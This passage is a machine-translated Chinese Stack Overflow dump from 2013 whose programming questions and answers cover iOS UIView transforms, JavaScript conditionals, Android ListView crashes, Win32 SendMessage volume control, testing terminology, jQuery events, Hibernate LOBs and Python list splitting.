我在模拟器和连接的设备上看到的问题是，当我启动应用程序时，我看到 NSLog(@"stoppingKeepAliveTimeout"); 从 applicationWillEnterForeground: 方法执行，但我从未看到 NSLog(@"startingKeepAliveTimeout"); 当应用程序最初启动或从 applicationDidEnterBackground 执行时：

我如何判断 keepalive 是否真的在工作甚至被调用？

# ios - 如何理解应用了旋转变换的 UIView 的帧？

> ID：16110276
> 
> 赞同：3
> 
> 时间：2013-04-19T17:25:45.550
> 
> 标签：ios, objective-c, uiview, cgaffinetransform

在为应用了旋转变换的 UIView 执行以下代码时，我遇到了一个奇怪的问题。我要做的是从超级视图中删除视图，然后将其插入特定视图下并恢复其框架：

```
 UIView* movedView=  [self.views objectAtIndex:newIndex];
    center = movedView.center;

   CGRect oldFrame  = movedView.frame;

    //find the layer on top and insert the moved view under that
    UIView* coveringView = [self.views objectAtIndex:newIndex-1];
    [movedView removeFromSuperview];
    [self.view insertSubview:movedView belowSubview:coveringView];
    movedView.frame = oldFrame; 
```

我希望在操作后视图会出现在同一个地方，但它会根据通过 CGAffineTransformMakeRotation() 应用的旋转量来移动。

通过将分配框架的调用替换为分配**中心**属性的调用，我得到了所需的行为。这让我开始思考——我如何理解 UIView 的框架在旋转时发生了什么？**有没有好的教程或可以帮助我从概念上理解变换如何影响 UIView 框架的东西？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T19:38:40.247

[`-[UIView frame]`文档是这样说的](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UIView_Class/UIView/UIView.html#//apple_ref/doc/uid/TP40006816-CH3-SW5)：

> 警告：如果该`transform`属性不是恒等变换，则该属性的值未定义，因此应被忽略。

和这个：

> 对此属性的更改可以设置动画。但是，如果该`transform`属性包含非恒等变换，则该`frame`属性的值未定义且不应修改。在这种情况下，您可以使用该属性重新定位视图并使用该`center`属性调整大小`bounds`。

因此，您可能希望完全避免考虑该`frame`属性，因为您`transform`不是身份。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-19T19:40:17.780

在 a 之后，不再定义a`CGAffineTransform`的属性。[文档](https://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIView_Class/UIView/UIView.html)说“警告：如果转换属性不是身份转换，则此属性的值未定义，因此应被忽略。”`frame``UIView`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T10:49:15.130

在我看来，`frame`是由`center`, the`transform`和 the计算的`bounds`

就像公式：`frame = f(center,transform,bounds)`. 但是不知道内部情况`f(x)`

# javascript - 如果（一组条件）这样做，如果（一组条件）这样做，如果（一组条件）这样做。什么？

> ID：16110278
> 
> 赞同：0
> 
> 时间：2013-04-19T17:25:48.633
> 
> 标签：javascript, if-statement, weather, wunderground

所以，我正在构建一个天气网站，并使用 Wunderground 的 API。在 AJAX XML 转储中，“icon”的值似乎是要走的路。此响应将动态更改页面上的 CSS。我有多个我想要的页面状态，但我似乎无法让它们工作。它似乎在第一个“if”语句之后停止。我需要它来检查是否 wu_icon == 某些条件，如果不是，请移至下一个条件并查看 wu_icon == 下一组条件。

这是[网站](http://newmedia.emerson.edu/~caleb_ungewitter/weather/index.html)。

任何帮助将非常感激。

```
function get_weather(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    wu_query = latitude + ',' + longitude;

    //Weather underground request URL format.
    wu_url = wu_base_url + '/' + wu_api_key + '/' + wu_features + '/q/' + wu_query + '.json';
    console.log('URL Query: ' + wu_url);

    $.ajax({
        url: wu_url,
        dataType: "jsonp",
        success: function(parsed_json) {
            console.log(parsed_json);

            var location = parsed_json['location']['city'];
            var wuurl = parsed_json['location']['wuiurl'];

            //simple forecast day 1.
            var wu = parsed_json['current_observation'];
            var wu_temp_f = wu['temp_f'];
            var wu_high_temp = wu['high'];
            var wu_low_temp = wu['low'];
            var wu_icon = wu['icon'];

            $('#location').html(location);
            $('#temp').html(wu_temp_f + '&degF');

            if (wu_icon == 'partlycloudy' || 'partlysunny' || 'unkown'){
                document.getElementById('rainclouds').style.display = 'none';
                document.getElementById('topclouds').style.display = 'block';
                document.getElementById('bottomclouds').style.display = 'block';
                document.getElementById('canvas').style.display = 'none';
                document.getElementById('snow').style.display = 'none';
                window.alert("1");
                }

            else if (wu_icon == 'rain' || 'chancerain' || 'chancetstorms' || 'tstorms'){
                document.getElementById('rainclouds').style.display = 'block';
                document.getElementById('topclouds').style.display = 'none';
                document.getElementById('bottomclouds').style.display = 'none';
                document.getElementById('canvas').style.display = 'block';
                document.getElementById('snow').style.display = 'none';
                window.alert("2");
                }

            else if (wu_icon == 'flurries' || 'snow' || 'chanceflurries' || 'chancesnow'){
                document.getElementById('rainclouds').style.display = 'block';
                document.getElementById('topclouds').style.display = 'none';
                document.getElementById('bottomclouds').style.display = 'none';
                document.getElementById('canvas').style.display = 'none';
                document.getElementById('snow').style.display = 'block';
                window.alert("3");
                }

            else if (wu_icon == 'clear' || 'mostlysunny' || 'sunny'){
                document.getElementById('rainclouds').style.display = 'none';
                document.getElementById('topclouds').style.display = 'block';
                document.getElementById('bottomclouds').style.display = 'none';
                document.getElementById('canvas').style.display = 'none';
                document.getElementById('snow').style.display = 'none';
                window.alert("4")
                }

            else if (wu_icon == 'chancesleet' || 'sleet'){
                document.getElementById('rainclouds').style.display = 'block';
                document.getElementById('topclouds').style.display = 'none';
                document.getElementById('bottomclouds').style.display = 'none';
                document.getElementById('canvas').style.display = 'block';
                document.getElementById('snow').style.display = 'block';
                window.alert("5");
                }

            else if (wu_icon == 'cloudy' || 'mostlycloudy' || 'fog' || 'hazy'){
                document.getElementById('rainclouds').style.display = 'block';
                document.getElementById('topclouds').style.display = 'none';
                document.getElementById('bottomclouds').style.display = 'none';
                document.getElementById('canvas').style.display = 'none';
                document.getElementById('snow').style.display = 'none';
                window.alert("6");
                }

        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:36:02.873

你的 if 语句应该看起来像

```
if (wu_icon == 'partlycloudy' || wu_icon == 'partlysunny' || wu_icon == 'unkown') 
```

较短的版本将是

```
if (["partlycloudy","partlysunny","unkown"].indexOf(wu_icon) != -1) 
```

# objective-c - 为什么即使调用了我的类别实例方法，我也无法获得它？

> ID：16110283
> 
> 赞同：5
> 
> 时间：2013-04-19T17:26:08.097
> 
> 标签：objective-c, nsattributedstring, objective-c-category

我试图更好地理解 Objective-C 运行时。考虑`NSAttributedString.h`哪个具有最小的界面，然后是更广泛的类别`NSExtendedAttributedString`。

现在考虑以下代码：

```
NSAttributedString *attributedString = [[NSAttributedString alloc] initWithAttributedString:[[NSAttributedString alloc] initWithString:@"ABC"]];
NSLog(@"Result: %@", attributedString); 
NSLog(@"Exists? %@", [NSString stringWithUTF8String:sel_getName(method_getName(class_getInstanceMethod(NSAttributedString.class, @selector(initWithAttributedString:))))]);    
NSLog(@"Exists? %@", [NSString stringWithUTF8String:sel_getName(method_getName(class_getInstanceMethod(NSAttributedString.class, @selector(string))))]);

// Produces this output
2013-04-19 10:17:35.364 TestApp[53300:c07] Result: ABC{
}
2013-04-19 10:17:35.364 TestApp[53300:c07] Exists? <null selector>
2013-04-19 10:17:35.365 TestApp[53300:c07] Exists? string 
```

我们发现实例方法是规范接口的一部分，但不是该类别中的实例方法。这怎么会发生，但它可以被成功调用？有没有办法自省并找到类别方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:53:42.663

在这种情况下发生的事情是您假设`attributedString`是 type `NSAttributedString`，但事实并非如此：

```
NSLog(@"Class: %@", [attributedString class]);

// Produces this output
2013-04-19 19:50:21.955 TestApp[1611:303] Class: NSConcreteAttributedString 
```

如果您更改`NSAttributedString.class`代码，`[attributedString class]`它将按预期工作。

# javascript - Facebook 注册插件使用 Javascript SDK 从 signed_request 获取注册数据

> ID：16110285
> 
> 赞同：3
> 
> 时间：2013-04-19T17:26:22.340
> 
> 标签：javascript, facebook, registration

我正在尝试使用 javascript SDK 使用 facebook 的注册插件。据我所知，以下是获取注册数据的步骤：

1）显示注册块（如果消费者登录到Facebook，则预填信息） 2）消费者填写所有信息并点击注册。3) 我们从 facebook 获得签名的请求，该请求是加密的。4）解码签名请求以获得“代码”。5) 验证此代码是否正确。6) 使用此代码，获取访问令牌 7) 使用访问令牌，我们可以获得姓名、电子邮件、性别等消费者数据。

我可以让我的代码工作到第 4 步。

a）之后我想知道如何验证“代码” b）现在我跳过了第 5 步，当我尝试使用“代码”获取“访问令牌”时，我得到错误 191：重定向 URI 必须是一个绝对的 URI。

这是我的代码，请指导我解决这个问题：

```
<script>
          window.fbAsyncInit = function() {
        FB.init({
            appId      : 'xxx', // App ID
            channelUrl : 'http:// localhost.qualityhealth.com/channel.html', 
            status     : true, // check login status
            cookie     : true, // enable cookies to allow the server to access the session
            xfbml      : true,  // parse XFBML
            oauth      : true
        });

        // Additional initialization code such as adding Event Listeners goes here
        FB.getLoginStatus(function(response) {
            if (response.status === 'connected') {

                var signedRequest = response.authResponse.signedRequest;
                var verifier = parse_signed_request(signedRequest, 'CLIENT_SECRET');
                var code = verifier.code;

                FB.api('https://graph.facebook.com/oauth/access_token?   client_id=CLIENT_ID&client_secret=CLIENT_SECRET&redirect_uri=http://localhost.qualityhealth.com&code=' + code, function(response1) {
                    console.log(response1);

                });
            }
        });

    };
    // Load the SDK Asynchronously
    (function(d){
        var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
        if (d.getElementById(id)) {return;}
        js = d.createElement('script'); js.id = id; js.async = true;
        js.src = "//connect.facebook.net/en_US/all.js";
        ref.parentNode.insertBefore(js, ref);
    }(document));

    function parse_signed_request(signed_request, secret) {

        encoded_data = signed_request.split('.',2);
        // decode the data
        sig = encoded_data[0];
        json = decode64(encoded_data[1]);
        data = JSON.parse(json); 

        // check algorithm - not relevant to error
        if (!data.algorithm || data.algorithm.toUpperCase() != 'HMAC-SHA256') {
            console.error('Unknown algorithm. Expected HMAC-SHA256');
            return null;
        }

        // check sig - not relevant to error

        console.log(data);
        return data;
    }

    function decode64(s) {
        var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
        var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for(i=0;i<64;i++){e[A.charAt(i)]=i;}
        for(x=0;x<L;x++){
            c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
            while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
        }
        return r;
    };

</script>
<div id="fb-root"></div>

<!--- Output Facebook Box--->
<fb:registration redirect-uri="http://localhost.qualityhealth.com"
                 fields='[
        {"name":"name"},
        {"name":"first_name"},
        {"name":"email"},
        {"name":"state", "description":"State", "type":"text"},
        {"name":"gender"},
        {"name":"phone",      "description":"Phone Number", "type":"text"},
        {"name":"birthday"}
        ]'
        >
</fb:registration> 
```

提前感谢您的帮助。

# php - 在哪里可以找到适用于 JavaScript Web 开发人员的现有 Eclipse IDE Helios SR2 的 PHP 插件

> ID：16110290
> 
> 赞同：0
> 
> 时间：2013-04-19T17:26:41.573
> 
> 标签：php, eclipse, eclipse-plugin

我使用 Eclipse IDE（用于 JavaScript Web 开发人员的 Helios SR2）进行 js、gae、html、css 等开发。并希望将其用于 php 开发。不幸的是，我无法在网上找到任何可靠的 php 插件链接，我可以将其添加到我现有的 eclipse IDE 中。我发现任何需要另一个完整的 eclipse-for-php IDE。

将不胜感激这方面的帮助。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:44:10.487

安装 pdt 插件，按照链接 [http://www.eclipse.org/pdt/downloads/中的说明进行操作](http://www.eclipse.org/pdt/downloads/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-07T13:59:30.873

正如上面另一个答案中所说，您需要下载“pdt”插件。
关于尝试安装 pdt 插件时的错误：您需要在 pdt 插件之前安装 Dynamic Language Toolkit。有关详细信息，请参阅此问题：
[Eclipse PDT 插件安装](https://stackoverflow.com/questions/18087492/eclipse-pdt-plugin-installation)

# java - 在我的自定义 Listview Android ==> 空指针异常..？

> ID：16110293
> 
> 赞同：1
> 
> 时间：2013-04-19T17:26:47.020
> 
> 标签：java, android, listview, arraylist

我是 Android 和 Java 的新手，请帮助我，这让我疯狂了 2 天。我的代码有什么问题。

当我运行代码时，它显示“不幸的是（**程序**）已停止。

我尝试在调试模式下找出答案。我看到空指针异常。

关键是我不知道错误在哪里。

* * *

MainActivity.Java

```
public class MainActivity extends Activity {

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    ArrayList<Food> arrayList = new ArrayList<Food>();
    Food f1 = new Food("COKE", 1, 1, 1);
    Food f2 = new Food("PEPSI", 2, 2, 2);
    Food f3 = new Food("Pizza", 3, 3, 2);
    Food f4 = new Food("Sprite", 4, 4, 2);

    arrayList.add(f1);
    arrayList.add(f2);
    arrayList.add(f3);
    arrayList.add(f4);

    FoodAdapter fa = new FoodAdapter(this, R.layout.food_row, arrayList);
    ListView lv = (ListView) findViewById(R.id.listView1);
    lv.setAdapter(fa);

} 
```

* * *

FoodAdapter.Java

```
public class FoodAdapter extends ArrayAdapter<Food> {
private Context context;
private int resourceId;
private ArrayList<Food> objects = new ArrayList<Food> ();

public FoodAdapter(Context context, int textViewResourceId,
        ArrayList<Food>  objects) {
    super(context, textViewResourceId, objects);

    this.context = context;
    this.resourceId = textViewResourceId;
    this.objects = objects;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {

    View v = null;
    FoodHolder holder = null;
    if(convertView==null){
        LayoutInflater inflater =( (Activity)context).getLayoutInflater();
        v = inflater.inflate(resourceId, null);  

        holder.Name = (TextView) v.findViewById(R.id.textView1);
        holder.FoodId = (TextView) v.findViewById(R.id.textView2);
        holder.SubId = (TextView) v.findViewById(R.id.textView3);

        v.setTag(holder);

    }else{
        holder = (FoodHolder)v.getTag();
    }
    Food food = objects.get(position);
    holder.FoodId.setText(food.FoodId);
    holder.Name.setText(food.Name);
    holder.SubId.setText(food.SubId);

    return v;
}

static class FoodHolder{
    TextView Name;
    TextView FoodId;
    TextView SubId;
} 
```

}

* * *

食品.Java

```
public class Food{
public Food(String name, int foodId, int subId, int productMode) {
    super();
    Name = name;
    FoodId = foodId;
    SubId = subId;
    ProductMode = productMode;
}
public String Name;
public int FoodId;
public int SubId;
public int ProductMode; 
```

}

**编辑：**

logcat 跟踪

```
 04-20 00:47:56.785: W/ResourceType(1486): No package identifier when getting value for resource number 0x00000001
04-20 00:47:56.785: D/AndroidRuntime(1486): Shutting down VM
04-20 00:47:56.785: W/dalvikvm(1486): threadid=1: thread exiting with uncaught exception (group=0x409961f8)
04-20 00:47:56.814: E/AndroidRuntime(1486): FATAL EXCEPTION: main
04-20 00:47:56.814: E/AndroidRuntime(1486): android.content.res.Resources$NotFoundException: String resource ID #0x1
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.content.res.Resources.getText(Resources.java:247)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.TextView.setText(TextView.java:3428)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at com.example.testconcept.FoodAdapter.getView(FoodAdapter.java:50)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.AbsListView.obtainView(AbsListView.java:2033)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.ListView.makeAndAddView(ListView.java:1772)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.ListView.fillDown(ListView.java:672)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.ListView.fillFromTop(ListView.java:732)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.ListView.layoutChildren(ListView.java:1625)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.AbsListView.onLayout(AbsListView.java:1863)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.View.layout(View.java:11180)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.ViewGroup.layout(ViewGroup.java:4203)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.FrameLayout.onLayout(FrameLayout.java:431)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.View.layout(View.java:11180)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.ViewGroup.layout(ViewGroup.java:4203)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.LinearLayout.setChildFrame(LinearLayout.java:1628)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.LinearLayout.layoutVertical(LinearLayout.java:1486)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.LinearLayout.onLayout(LinearLayout.java:1399)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.View.layout(View.java:11180)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.ViewGroup.layout(ViewGroup.java:4203)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.widget.FrameLayout.onLayout(FrameLayout.java:431)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.View.layout(View.java:11180)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.ViewGroup.layout(ViewGroup.java:4203)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1468)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2418)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.os.Looper.loop(Looper.java:137)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at android.app.ActivityThread.main(ActivityThread.java:4340)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at java.lang.reflect.Method.invokeNative(Native Method)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at java.lang.reflect.Method.invoke(Method.java:511)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
04-20 00:47:56.814: E/AndroidRuntime(1486):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T17:28:27.890

你还没有实例化你的 Holder

```
if(convertView==null){

    holder =new FoodHolder();
     ..
     ..

} 
```

**编辑：**

第二个问题是

> 您正在为 GetView 中的 TextView 分配 int 值，它会将其视为字符串资源 ID

所以它会抛出 String resource not found 异常

尝试像这样设置它们

```
 holder.FoodId.setText(String.valueOf(food.FoodId));
 holder.Name.setText(food.Name);
 holder.SubId.setText(String.valueOf(food.SubId)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:44:17.510

以这种方式初始化和使用它，

```
ViewHolder holder;              
if (convertView == null) 
{
   holder = new ViewHolder();
   holder.text = (TextView) rowView.findViewById(R.id.list_text);                   
   rowView.setTag(holder);
} 
else
{
    rowView = convertView;
    holder = new ViewHolder();
    holder = (ViewHolder) rowView.getTag();
} 
```

# c++ - C++ 为什么发送消息不起作用？

> ID：16110295
> 
> 赞同：-2
> 
> 时间：2013-04-19T17:27:14.983
> 
> 标签：c++, winapi, handle, sendmessage, hwnd

在 C# 中，此 SendMessage 函数成功提高音量：

```
[DllImport("user32.dll")]
public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

SendMessage(Handle, 0x319, (int)Handle, APPCOMMAND_VOLUME_UP); 
```

但是在 C++ 中，这个 SendMessage 函数不起作用，即音量没有上升：

```
// HWND hwnd = CreateWindow(...
SetWindowText(hwnd, "Hi"); // Worked
SendMessage(hwnd, WM_APPCOMMAND, (int)hwnd, APPCOMMAND_VOLUME_UP); // Don't work 
```

我错了什么？你能帮我解决一下吗？谢谢！

完整代码：

```
#include <windows.h>
HHOOK _hhook;
HWND hwnd;
HINSTANCE _hInstance;

KBDLLHOOKSTRUCT kbdStruct;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            // a key (non-system) is pressed.
            if (kbdStruct.vkCode == VK_F1)
            {
                // F1 is pressed!
                SetWindowText(hwnd, "Hi");
                SendMessage(hwnd, WM_APPCOMMAND, (WPARAM)hwnd, APPCOMMAND_VOLUME_UP);
                //MessageBox(NULL, "F1 is pressed!", "key pressed", MB_ICONINFORMATION);
            }
        }
    }
    return CallNextHookEx(_hhook, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc( HWND hwnd, UINT message, WPARAM wparam, LPARAM lparam );
int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow );

int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow ) 
{
    WNDCLASS wc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hbrBackground = (HBRUSH)GetStockObject( WHITE_BRUSH );
    wc.hCursor = LoadCursor( NULL, IDC_HAND );
    wc.hIcon = LoadIcon( NULL, IDI_APPLICATION );
    wc.hInstance = hInstance;
    wc.lpfnWndProc = WndProc;
    wc.lpszClassName = TEXT("Philip");
    wc.lpszMenuName = 0;
    wc.style = CS_HREDRAW | CS_VREDRAW;

    RegisterClass( &wc );
    hwnd = CreateWindow(
        TEXT("Philip"),
        TEXT("Hello World!"),
        WS_OVERLAPPEDWINDOW,
        10, 10,
        500, 200,
        NULL, NULL,
        hInstance, NULL );

    ShowWindow(hwnd, iCmdShow );
    UpdateWindow(hwnd);

    _hhook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);

    MSG msg;
    while( GetMessage( &msg, NULL, 0, 0 ) )
    {
        TranslateMessage( &msg );
        DispatchMessage( &msg );
    }
    return msg.wParam;
}

LRESULT CALLBACK WndProc(   HWND hwnd,
                            UINT message,
                            WPARAM wparam,
                            LPARAM lparam )
{

    switch( message )
    {

    case WM_DESTROY:
        PostQuitMessage( 0 ) ;
        return 0;
        break;

    }
    return DefWindowProc( hwnd, message, wparam, lparam );
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T19:04:02.913

您需要使用`MAKELPARAM`宏传递`APPCOMMAND_VOLUME_UP`给 SendMessage`MAKELPARAM(0,APPCOMMAND_VOLUME_UP)` 最终版本应如下所示

```
SendMessage(hwnd, WM_APPCOMMAND, (WPARAM)hwnd, MAKELPARAM(0,APPCOMMAND_VOLUME_UP)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T19:00:01.027

经过一番调查，我能够得到这个工作。问题源于传递了一个不正确的`lParam`值。命令本身位于值的高 16 位，但您没有考虑到这一点。以下更改应该让您上路：

```
SendMessage(hwnd, WM_APPCOMMAND, (WPARAM)hwnd, APPCOMMAND_VOLUME_UP << 16); 
```

# testing - 测试方法

> ID：16110296
> 
> 赞同：1
> 
> 时间：2013-04-19T17:27:24.663
> 
> 标签：testing, black-box, white-box

我目前正在写我的论文，并正在调查软件质量和测试。

我发现很难区分以下术语，并想知道是否有人可以帮助我这样做。

**（动态和静态测试）和（验证和验证测试）**

我目前的理解是动态测试和验证测试是一回事，静态测试和验证测试也是如此。我认为动态测试是指测试系统的性能和行为，而静态测试则着眼于控制流、数据流、编码标准和代码度量等检查。

我对此是否正确？（我相信是这样）

**黑盒和白盒测试**

我最大的问题是了解这两者的来源。从一些来源，我开始相信这些与动态和静态测试相同。但是其他人让我相信这些只是测试技术的类别，例如边界分析和分区测试。

在这方面的任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T06:05:20.900

首先，所有四个术语都是不同的。

**动态测试：**涉及执行组件或系统软件的测试。

当您谈论**动态测试**时，您的源代码处于**执行阶段**。您试图通过在系统中输入值来查找错误。

**静态测试：**测试软件开发工件，例如需求、设计或代码，而不执行这些工件，例如审查或静态分析。简单来说，

在**静态测试**中，您的源代码**不在执行阶段**，您的目标是文档部分以查找错误。

**验证：**通过检查和提供客观证据来确认特定预期用途或应用的要求已得到满足。

**验证：**通过检查和提供客观证据来确认已满足特定要求。

*请参见下图，它解释了**Validation 和 Varification**之间的差异。* ![在此处输入图像描述](https://i.stack.imgur.com/tyoHQ.png)

**黑盒测试：**测试，无论是功能性的还是非功能性的，不参考组件或系统的内部结构。

**白盒测试：**基于对组件或系统内部结构的分析的测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-14T10:13:18.233

黑盒：对于这种方法，您不需要任何编程技能。黑盒测试是一种软件测试方法，其中测试者不知道被测试项目的内部结构/设计/实现

白盒：在这种方法中，您必须具备编程技能。白盒测试是一种软件测试方法，其中测试项目的内部结构/设计/实现是测试人员已知的。

# jquery - 阻止 jQuery 选择也匹配的父母

> ID：16110302
> 
> 赞同：3
> 
> 时间：2013-04-19T17:28:00.607
> 
> 标签：jquery, drop-down-menu, navigation, responsive-design

我正在尝试设置一个响应式下拉菜单，在响应模式下，它会覆盖悬停下降，禁用任何具有子 UL 的链接的默认点击事件（因此那些在其下方有下拉 ul 菜单的链接）和单击时展开 CHILD ul。

```
$('.nav ul li').click(function() {

    if( $(this).children('ul').length ) {

        if ( $(window).width() <= 980 ) { 

            event.preventDefault();

            if( $(this).children('ul:first').is(':visible') ) {
                $(this).children('ul:first').hide(); }

            else { $(this).children('ul:first').show(); }

        } 

    }

}); 
```

我已经让它工作了，但是发生的事情是选择器也匹配当前 li 的所有祖先......

所以如果我有：

```
<div class="nav">
    <ul>
        <li>Item 1
            <ul>
                <li>Item 2
                    <ul>
                        <li>Item 3</li>
                    </ul>
                </li>
            </ul>
        </li>
    </ul>
</div> 
```

...所以发生的情况是，如果我单击第 2 项，它将展开其下方的 UL，但随后它还将选择第 1 项的 li，并将 UL 隐藏在其下方并隐藏它，因为它当前可见。

我需要它只选择用户单击的 li 正下方的 UL，而不是它的任何父项（因为那样它将开始隐藏所有内容，就像代码告诉它做的那样）。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:31:32.793

您没有传递事件参数，稍后您将尝试使用该参数：

```
('.nav ul li').click(function(event) {
                                ^------------- ADD THIS 
```

如果阻止事件还不够，您可能还需要停止传播事件：

```
event.preventDefault();
event.stopPropagation(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:33:27.873

可能选择`>`父母的直接孩子并停止事件冒泡`.stopPropagation()`将起作用，如下所示：

```
$('.nav ul li').click(function (e) {
  e.stopPropagation();
  if ($('> ul:first', this).is(':visible')) {
    $('> ul:first', this).hide();
  } else {
    $('> ul:first', this).show();
  }
}); 
```

### [演示](http://jsfiddle.net/MHSsX/)

# encoding - 使用 Hibernate 延迟加载 LOB（原为：Resteasy 图片上传时编码错误）

> ID：16110306
> 
> 赞同：0
> 
> 时间：2013-04-19T17:28:11.453
> 
> 标签：encoding, ejb, resteasy

我正在尝试使用 curl 将文件上传到 Web 服务，然后将这些文件保存在数据库中。到目前为止，它对文本文件运行良好，但图片已损坏。

假设我正在使用 curl 上传文件 logo.png ：

`curl -T D:\logo.png http://127.0.0.1:8080/my-web-service/resteasy/document/metadata?id=logo"&"contentType=IMAGE"&"httpType=image"/"png`

我的网络服务使用这样的数据：

```
@Path("metadata")
@PUT
public void putDocument(
    @QueryParam("id") String docId,
    @DefaultValue("GENERIC_CONTENT") @QueryParam("contentType") String contentType,
    @DefaultValue("text/html") @QueryParam("httpType") String httpType,
    byte[] docContent) {
Document doc = new Document();
doc.setDocumentId(docId);
doc.setContentType(new RefContentType(ContentType.valueOf(contentType)));
doc.setHttpContentType(httpType);
doc.setContent(docContent);
doc = getDAO().save(doc);
LOG.info("Document saved successfully id : " + doc.getId()); 
```

所以我最好的猜测是 setContent 方法不适用于包含纯文本以外的内容的字节数组。我怎么知道 curl 是否正在搞乱上传，或者是我的 ejb 是否严重读取了数组？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T13:05:25.167

原来上传工作正常。我可以通过使用 Java`BufferedImage`类将磁盘上的数组保存为图像文件来确认这一点。

问题在于 Hibernate 的注释。

我的字节数组使用这个 Java 变量保存在 Oracle blob 中：

```
@Column(name="CONTENT")
@Lob //@Basic(fetch=FetchType.LAZY)
byte[] content= null; 
```

和注释不能`@Lob`一起`@Basic`正常工作。有关此问题的更多解释，请参阅此问题：[Spring, Hibernate, Blob lazy loading](https://stackoverflow.com/questions/2605477/spring-hibernate-blob-lazy-loading)

# python - 按字符串拆分列表和字符串的列表

> ID：16110307
> 
> 赞同：2
> 
> 时间：2013-04-19T17:28:22.907
> 
> 标签：python, list, split

是否有一种方便的 Pythonic 方法可以通过搜索字符串拆分列表（即使列表包含非字符串并且具有嵌套列表）。例如，假设我想用“，”分割以下内容：

```
[[ 'something', ',', 'eh' ], ',', ['more'], ',', 'yet more', '|', 'even more' ] 
```

这将变成：

```
[[[ 'something', ',', 'eh' ]], [['more']], ['yet more', '|', 'even more']] 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T17:31:28.900

看看[`itertools.groupby`](http://docs.python.org/2/library/itertools.html#itertools.groupby)：

```
In [1]: from itertools import groupby

In [2]: lst = [[ 'something', ',', 'eh' ], ',', ['more'], ',', 'yet more', '|', 'even more' ]

